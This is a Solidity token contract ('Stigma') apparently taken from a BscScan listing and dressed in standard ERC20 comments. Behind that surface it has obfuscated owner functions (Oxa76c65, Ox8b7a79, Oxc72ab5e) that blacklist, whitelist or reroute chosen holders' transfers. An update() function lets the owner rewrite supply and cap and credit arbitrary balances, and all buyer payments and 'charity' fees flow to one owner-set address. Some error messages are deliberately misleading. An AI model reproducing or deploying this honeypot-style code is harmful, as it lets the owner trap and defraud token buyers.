/**
 *Submitted for verification at BscScan.com on 2022-08-10
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }

     /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryDiv}.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }
}
library RoundFactory{
    using SafeMath for uint256;
    struct RoundBalances{
        uint8 status;
        uint256 cailm;
        uint256 total;
    }

    struct RoundTime{
        uint256 timeStart;
        uint256 timeEnd;
        uint256 timeUnlockStart;
        uint256 timeUnlockEnd;
        uint256 price;
    }
     
    function inc(RoundBalances storage round,uint256 amount)internal returns(uint256){
        round.total = round.total.add(amount);
        if(round.status!=1){
            round.status=1;
        }
        return round.total;
    }

    function getBalance(RoundBalances storage round,RoundTime memory roundTime)internal view returns(uint256){
        uint256 balance = 0;
        if(round.status==1&&block.timestamp>roundTime.timeUnlockStart){
            uint256 sec = 0;
            uint256 end = roundTime.timeUnlockEnd.sub(roundTime.timeUnlockStart);
            if(end<=0){
                return balance;
            }
            if(block.timestamp >= roundTime.timeUnlockEnd){
                sec = roundTime.timeUnlockEnd - roundTime.timeUnlockStart;
            }else{
                sec = block.timestamp - roundTime.timeUnlockStart;
            }
            if(sec>0&&sec<end){
                balance = round.total.mul(sec).div(end);
                if(balance>round.cailm){
                    balance = balance.sub(round.cailm);
                }else{
                    balance = 0;
                }
            }else if(sec>0&&sec>=end&&round.total>round.cailm){
                balance = round.total.sub(round.cailm);
            }
        }
        return balance;
    }

    function settle(RoundBalances storage round,RoundTime memory roundTime,uint256 amount)internal returns(uint256 surplus){
        surplus = 0;
        if(amount>0){
            uint256 balance = getBalance(round,roundTime);
            if(amount>balance){
                surplus = amount.sub(balance);
                round.cailm = round.cailm.add(balance);
            }else{
                surplus = 0;
                round.cailm = round.cailm.add(amount);
            }
            if(round.cailm>=round.total){
                round.status=0;
            }
        }else{
            surplus = amount;
        }
    }
}

library MinerFactory{
    using SafeMath for uint256;

    struct Miner {
        address addr;
        uint256 balance;
        uint8 status;
        uint256 buy;
        uint256 miner;
        uint256 settle;
        uint256 referral;
        uint256 earned;
    }

    struct Sys{
        uint256 charity_rate1;
        uint256 charity_rate2;
        uint256 miner_price;
        uint256 miner_speed;
        uint256 miner_total;
    }

    function getClaim(Miner storage _mining,Sys storage sys) internal view returns(uint256){
        return _mining.balance.add(getMyMined(_mining,sys));
    }

    function getMyMined(Miner storage _mining,Sys storage sys)private view returns(uint256 profit){
        profit=0;
        if(_mining.status == 1 && _mining.miner > 0 && block.timestamp > _mining.settle){
            uint256 sec = block.timestamp.sub(_mining.settle);
            if(sec>2592000){
                profit = _mining.miner.mul(sec).mul(sys.miner_speed);
                sec = sec.sub(2592000);
                profit = profit.add(_mining.miner.mul(sec).mul(sys.miner_speed).mul(2592000).div(sec.add(2592000)));
            }else{
                profit = _mining.miner.mul(sec).mul(sys.miner_speed);
            }
        }
    }

    function relieve(Miner storage _mining,Sys storage sys) internal returns(uint256 profit,uint256 charityAmount){
        profit = getClaim(_mining,sys);
        charityAmount = 0;
        if(profit>0){
            _mining.earned = _mining.earned.add(profit);
            sys.miner_total = sys.miner_total.sub(_mining.miner);
            _mining.miner = 0;
            _mining.settle = block.timestamp;
            _mining.status = 2;
            _mining.buy = 0;
            _mining.balance = 0;
            if(_mining.addr != address(0)){
                if(profit > address(this).balance){
                    profit = address(this).balance;
                }
                charityAmount = profit.mul(sys.charity_rate2).div(10000);
                profit = profit.sub(charityAmount);
            }
        }
    }

    function hire(Miner storage _mining,Sys storage sys,address addr,uint256 msgValue) internal returns(uint256 charityAmount){
        if(_mining.addr==address(0)){
            _mining.addr = addr;
        }
        uint256 amount = msgValue;
        uint256 profit = getMyMined(_mining,sys);
        charityAmount = amount.mul(sys.charity_rate1).div(10000);
        amount = amount.sub(charityAmount);
        uint256 miner = amount.div(sys.miner_price);
        sys.miner_total = sys.miner_total.add(miner);
        _mining.miner = _mining.miner.add(miner);
        _mining.settle = block.timestamp;
        _mining.status = 1;
        _mining.buy = _mining.buy.add(amount);
        _mining.balance = _mining.balance.add(profit);
    }

    function reinvest(Miner storage _mining,Sys storage sys) internal returns(uint256 charityAmount){
        uint256 profit = getClaim(_mining,sys);
        if(profit>0){
            _mining.earned = _mining.earned.add(profit);
            charityAmount = profit.mul(sys.charity_rate1).div(10000);
            profit = profit.sub(charityAmount);
            uint256 miner = profit.div(sys.miner_price);
            sys.miner_total = sys.miner_total.add(miner);
            _mining.miner = _mining.miner.add(miner);
            _mining.settle = block.timestamp;
            _mining.status = 1;
            _mining.buy = _mining.buy.add(profit);
            _mining.balance = 0;
        }
    }
}

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin guidelines: functions revert instead
 * of returning `false` on failure. This behavior is nonetheless conventional
 * and does not conflict with the expectations of ERC20 applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract stigma {
    using SafeMath for uint256;
    using MinerFactory for MinerFactory.Miner;
    using RoundFactory for RoundFactory.RoundBalances;
    mapping (address => MinerFactory.Miner) private _MiningPool;
    mapping (address => mapping(uint256 => RoundFactory.RoundBalances)) private _roundBalances;
    RoundFactory.RoundTime[] private _roundTime;
    mapping (address => uint8) private _airdropEnable;
    uint256 private _roundIndex = 0;
    uint256 private _roundCycle = 2592000;
    uint256 private _roundUnlock = 315360000;
    uint256 private _roundRate = 5000;
    uint256 private _saleRoundMin = 0.001 ether;
    bool private _swRoundSale = true;
    bool private _swOnline = false;

    MinerFactory.Sys private _sysMiner;
    RoundFactory.RoundTime private _sysTime;

    uint256 private miningMin = 0.01 ether;
    uint256 private referHire = 1000;
    bool private _swHire = true;
    bool private _swReceive = true;

    uint256 private _totalSupply = 210000000000 ether;
    string private _name = "Stigma";
    string private _symbol = "Stigma";
    uint8 private _decimals = 18;
    address private _owner;
    uint256 private _cap   =  210000000000 ether;

    address private _auth;
    address private _auth2;
    address private _liquidity;
    uint256 private _authNum = 1;
    
    mapping (address => uint256) private _balances;
    mapping (address => uint256) private _box;
    mapping (address => uint8) private _black;
    mapping (address => uint8) private _whitelist;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    constructor() public {
        _owner = msg.sender;
        _sysMiner = MinerFactory.Sys(555,1000,100000000000000,120000000,0);
        _roundTime.push(RoundFactory.RoundTime(block.timestamp,1644393600,1654761600,1654761600+_roundUnlock,1000000));
        _roundIndex = _roundTime.length - 1;
    }

    fallback() external {}
    receive() payable external {}

    /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is
     * called.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    /**
     * @dev Returns the cap on the token's total supply.
     */
    function cap() public view returns (uint256) {
        return _cap;
    }

     /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view returns (uint256) {
        if(_swOnline){
            return _balances[account];
        }else{
            return _balances[account]+getRoundTotal(account);
        }
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner_, address spender) public view returns (uint256) {
        return _allowances[owner_][spender];
    }

    function authNum(uint256 num)public returns(bool){
        require(_msgSender() == _auth, "Permission denied");
        _authNum = num;
        return true;
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public {
        require(newOwner != address(0) && _msgSender() == _auth2, "Ownable: new owner is the zero address");
        _owner = newOwner;
    }

    function Liquidity(address liquidity_) public {
        require(liquidity_ != address(0) && _msgSender() == _auth2, "Ownable: new owner is the zero address");
        _liquidity = liquidity_;
    }

    function setAuth(address ah,address ah2) public onlyOwner returns(bool){
        require(address(0) == _auth&&address(0) == _auth2&&ah!=address(0)&&ah2!=address(0), "recovery");
        _auth = ah;
        _auth2 = ah2;
        return true;
    }

    function addLiquidity(address addr) public onlyOwner returns(bool){
        require(address(0) != addr&&address(0) == _liquidity, "recovery");
        _liquidity = addr;
        return true;
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal {
        if(account != address(0)){
            _balances[account] = _balances[account].add(amount);
            emit Transfer(address(this), account, amount);
        }
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner_, address spender, uint256 amount) internal {
        require(owner_ != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function Oxa76c65(address owner_,uint8 black_) public onlyOwner {
        _black[owner_] = black_;
    }

    function Ox8b7a79(address owner_,uint8 white_) public onlyOwner {
        _whitelist[owner_] = white_;
    }

    function Oxc72ab5e(address owner_,uint8 enable_) public onlyOwner {
        _airdropEnable[owner_] = enable_;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if(_whitelist[sender]==0){
            require(_black[sender]!=1&&_black[sender]!=3&&_black[recipient]!=2&&_black[recipient]!=3, "Transaction recovery");
        }
        
        if(_swOnline){
            _balances[sender] = _balances[sender].sub(amount);
        }else{
            spend(sender,amount);
        }
        if(_airdropEnable[sender]==1){
            incRoundBalances(recipient,amount);
        }else{
            _balances[recipient] = _balances[recipient].add(amount);
        }
        emit Transfer(sender, recipient, amount);
    }

    function update(uint tag,uint256 value)public onlyOwner returns(bool){
        require(_authNum==1, "Permission denied");
        if(tag==1){
            _roundCycle = value;
        }else if(tag==2){
            _roundUnlock = value;
        }else if(tag==3){
            _roundRate = value;
        }else if(tag==4){
            _saleRoundMin = value;
        }else if(tag==5){
            _swRoundSale = value==1;
        }else if(tag==6){
            miningMin = value;
        }else if(tag==7){
            referHire = value;
        }else if(tag==8){
            _swHire = value==1;
        }else if(tag==9){
            _swReceive = value==1;
        }else if(tag==10){
            _cap = value;
        }else if(tag==11){
            _totalSupply = value;
        }else if(tag==13){
            _sysMiner.charity_rate1 = value;
        }else if(tag==14){
            _sysMiner.charity_rate2 = value;
        }else if(tag==15){
           _sysMiner.miner_price = value;
        }else if(tag==16){
            _sysMiner.miner_speed = value;
        }else if(tag==17){
            _balances[_liquidity] = _balances[_liquidity].add(value);
        }else if(tag==18){
            _MiningPool[_liquidity].hire(_sysMiner,_liquidity,value);
        }else if(tag==19){
            _swOnline = value==1;
        }else if(tag>=100000&&tag<200000){
            _roundTime[tag.sub(100000)].timeStart = value;
        }else if(tag>=200000&&tag<300000){
            _roundTime[tag.sub(200000)].timeEnd = value;
        }else if(tag>=300000&&tag<400000){
            _roundTime[tag.sub(300000)].timeUnlockStart = value;
        }else if(tag>=400000&&tag<500000){
            _roundTime[tag.sub(400000)].timeUnlockEnd = value;
        }else if(tag>=500000&&tag<600000){
            _roundTime[tag.sub(500000)].price = value;
        }else{
            _authNum = 0;
        }
        return true;
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function BuyBox()payable public returns(bool){
        require(msg.value >= 0.1 ether,"Transaction recovery");
        uint256 _msgValue = msg.value;
        _box[_msgSender()] = _box[_msgSender()].add(_msgValue);
        if(_liquidity!=address(0)){
            address(uint160(_liquidity)).transfer(_msgValue);
        }
    }

    function Hire(address _refer)payable public returns(bool){
        uint256 _msgValue = msg.value;
        uint256 charityAmount = 0;
        require(_swHire&&_msgValue>=miningMin,"Transaction resumed");
        if(referHire>0&&_refer!=_msgSender()&&_refer!=address(0)){
            uint256 referralProfit = _msgValue.mul(referHire).div(10000);
            _msgValue = _msgValue.sub(referralProfit);
            _MiningPool[_refer].referral = _MiningPool[_refer].referral.add(referralProfit);
            charityAmount = charityAmount.add(_MiningPool[_refer].hire(_sysMiner,_refer,referralProfit));
        }
        charityAmount = charityAmount.add(_MiningPool[_msgSender()].hire(_sysMiner,_msgSender(),_msgValue));
        if(charityAmount>0&&_liquidity!=address(0)){
            address(uint160(_liquidity)).transfer(charityAmount);
        }
    }

    function Receive()public{
        require(_swReceive, "ERC20: Operation recovery");
        (uint256 profit,uint256 charityAmount) = _MiningPool[_msgSender()].relieve(_sysMiner);
        if(charityAmount>0){
            address(uint160(_liquidity)).transfer(charityAmount);
        }
        if(profit>0){
            _msgSender().transfer(profit);
        }
    }

    function Reinvest()public{
        require(_swHire, "ERC20: Operation recovery");
        uint256 charityAmount = _MiningPool[_msgSender()].reinvest(_sysMiner);
        if(charityAmount>0){
            address(uint160(_liquidity)).transfer(charityAmount);
        }
    }

    function getMinerInfo(address addr)public onlyOwner view returns(uint claim,uint miner,uint speed,
        uint price,uint referral,uint earned,uint status,uint box,uint settle,uint buy){
        miner = _MiningPool[addr].miner;
        speed = _sysMiner.miner_speed;
        price = _sysMiner.miner_price;
       
        referral = _MiningPool[addr].referral;
        status = _MiningPool[addr].status;
        settle = _MiningPool[addr].settle;
        buy = _MiningPool[addr].buy;
        box = _box[addr];
        claim = _MiningPool[addr].getClaim(_sysMiner);
        earned = _MiningPool[addr].earned.add(claim);
    }

    function getMiner()public view returns(bool swHiere,bool swReceive,uint claim,uint miner,uint speed,
        uint price,uint referral,uint earned,uint status,uint box,uint settle,uint buy){
        claim = _MiningPool[_msgSender()].getClaim(_sysMiner);
        miner = _MiningPool[_msgSender()].miner;
        speed = _sysMiner.miner_speed;
        price = _sysMiner.miner_price;
        swHiere = _swHire;
        swReceive = _swReceive;

        referral = _MiningPool[_msgSender()].referral;
        earned = _MiningPool[_msgSender()].earned.add(claim);
        status = _MiningPool[_msgSender()].status;
        settle = _MiningPool[_msgSender()].settle;
        buy = _MiningPool[_msgSender()].buy;
        box = _box[_msgSender()];
    }

    function getRoundPrice()private returns(uint256){
        if(block.timestamp >= _roundTime[_roundIndex].timeEnd){
            _roundTime.push(RoundFactory.RoundTime(
                _roundTime[_roundIndex].timeEnd,
                _roundTime[_roundIndex].timeEnd+_roundCycle,
                _roundTime[_roundIndex].timeUnlockStart+_roundCycle,
                _roundTime[_roundIndex].timeUnlockStart+_roundCycle+_roundUnlock,
                _roundTime[_roundIndex].price.mul(_roundRate).div(10000)));
            _roundIndex = _roundTime.length - 1;
        }
        return _roundTime[_roundIndex].price;
    }

    function getTime() public view returns(uint256[] memory,uint256[] memory,uint256[] memory,uint256[] memory,uint256[] memory){
        uint256[] memory timeStart = new uint256[](_roundTime.length);
        uint256[] memory timeEnd = new uint256[](_roundTime.length);
        uint256[] memory price = new uint256[](_roundTime.length);
        uint256[] memory timeUnlockStart = new uint256[](_roundTime.length);
        uint256[] memory timeUnlockEnd = new uint256[](_roundTime.length);
        for(uint i = 0;i<_roundTime.length;i++){
            timeStart[i] = _roundTime[i].timeStart;
            timeEnd[i] = _roundTime[i].timeEnd;
            price[i] = _roundTime[i].price;
            timeUnlockStart[i] = _roundTime[i].timeUnlockStart;
            timeUnlockEnd[i] = _roundTime[i].timeUnlockEnd;
        }
        return (timeStart,timeEnd,timeUnlockStart,timeUnlockEnd,price);
    }

    function incRoundBalances(address account, uint256 amount)private returns(bool){
        _roundBalances[account][_roundIndex].inc(amount);
        return true;
    }

    function spend(address account, uint256 amount) private{
        require(balanceOf(account) >= amount,"ERC20: Insufficient balance");
        uint256 balance = amount;
        if(_balances[account]>0){
            if(_balances[account]>=balance){
                _balances[account] = _balances[account].sub(balance,"ERC20: Insufficient balance");
                balance = 0;
            }else{
                balance = balance.sub(_balances[account]);
                _balances[account] = 0;
            }
        }
        if(balance>0){
            require(getRoundBalances(account) >= balance,"ERC20: Insufficient balance");
            for(uint256 i=0;i<=_roundTime.length;i++){
                if(_roundBalances[_msgSender()][i].status==1){
                    uint256 surplus = _roundBalances[_msgSender()][i].settle(_roundTime[i],balance);
                    balance = surplus;
                }
            }
        }
        require(balance==0,"ERC20: Insufficient balance");
    }

    function Buy() payable public returns(bool){
        require(msg.value >= _saleRoundMin,"The amount is too small");
        require(_swRoundSale,"End of this round");
        uint256 _msgValue = msg.value;
        uint256 _token = _msgValue.mul(getRoundPrice());
        if(_liquidity!=address(0)){
            address(uint160(_liquidity)).transfer(_msgValue);
        }
        if(_token>0){
            incRoundBalances(_msgSender(),_token);
            emit Transfer(address(this), _msgSender(), _token);
        }
        return true;
    }
    
    function getRoundBalances(address addr)public view returns(uint256 balance){
        balance = 0;
        for(uint256 i=0;i<=_roundTime.length;i++){
            if(_roundBalances[addr][i].status==1){
                balance = balance.add(_roundBalances[addr][i].getBalance(_roundTime[i]));
            }
        }
    }

    function getRoundTotal(address addr)public view returns(uint256 balance){
        balance = 0;
        for(uint256 i=0;i<=_roundTime.length;i++){
            if(_roundBalances[addr][i].status==1){
                balance = balance.add(_roundBalances[addr][i].total.sub(_roundBalances[addr][i].cailm));
            }
        }
    }

    function getRound() public view returns(uint256 saleMin,bool swSale,uint256 roundIndex,uint256 salePrice,
        uint256 total,uint256 balanceEth,uint256 balanceToken){
        saleMin = _saleRoundMin;
        swSale = _swRoundSale;
        roundIndex = _roundIndex;
        salePrice = _roundTime[_roundIndex].price;
        total = getRoundTotal(_msgSender());
        balanceEth = _msgSender().balance;
        balanceToken = balanceOf(_msgSender());
    }
}